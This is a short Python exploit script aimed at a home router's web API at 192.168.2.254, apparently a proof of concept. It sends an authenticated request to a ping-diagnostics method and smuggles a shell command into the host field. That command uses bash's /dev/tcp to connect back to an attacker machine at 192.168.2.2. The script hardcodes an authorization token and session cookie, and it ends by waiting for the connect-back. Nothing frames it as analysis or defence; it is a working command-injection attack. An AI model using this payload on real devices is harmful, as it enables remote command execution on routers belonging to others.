import requests
import time

# Target device
TARGET_URL = "http://192.168.2.254/ws/NeMo/Intf/lan:getMIBs"
ATTACKER_IP = "192.168.2.2"

# Auth/session values (replace with fresh ones if needed)
AUTH_TOKEN = "FRPuaxpWpGVBdsOmzFyJx927XrPIm0Wl8KGjCcUF5lLxbRvXgWCmgcq+R7/1hC2b"
SESSION_COOKIE = "Hy/+xxKc/ZY4GkR4gx51dSdB"

# Bash TCP connect-back payload
bash_payload = "127.0.0.1%3Bbash+-c+'exec+3<>/dev/tcp/192.168.2.2/80;+echo+-e+\"GET+/pwn+HTTP/1.1\\r\\nHost:+192.168.2.2\\r\\n\\r\\n\"+>&3;+cat+<&3'"


# Headers and cookies
headers = {
    "Accept": "*/*",
    "Accept-Language": "en-US,en;q=0.9",
    "Connection": "keep-alive",
    "Origin": "http://192.168.2.254",
    "Referer": "http://192.168.2.254/",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "authorization": f"X-Sah {AUTH_TOKEN}",
    "content-type": "application/x-sah-ws-4-call+json",
    "x-context": AUTH_TOKEN
}

cookies = {
    "a935d316/accept-language": "en-US,en",
    "a935d316/sessid": SESSION_COOKIE
}

# Payload structure
data = {
    "service": "IPPingDiagnostics",
    "method": "execDiagnostic",
    "parameters": {
        "ipHost": bash_payload,
        "ProtocolVersion": "Any"
    }
}

# Send the request
try:
    response = requests.post(
        TARGET_URL,
        headers=headers,
        cookies=cookies,
        json=data,
        verify=False,
        timeout=5
    )
    print(f"[+] Payload sent. Status: {response.status_code}, Length: {len(response.text)}\nResponse: {response.text}")
except Exception as e:
    print(f"[!] Error sending payload: {e}")

# Wait for connect-back
print("[*] Waiting for connect-back on attacker machine...")
time.sleep(10)

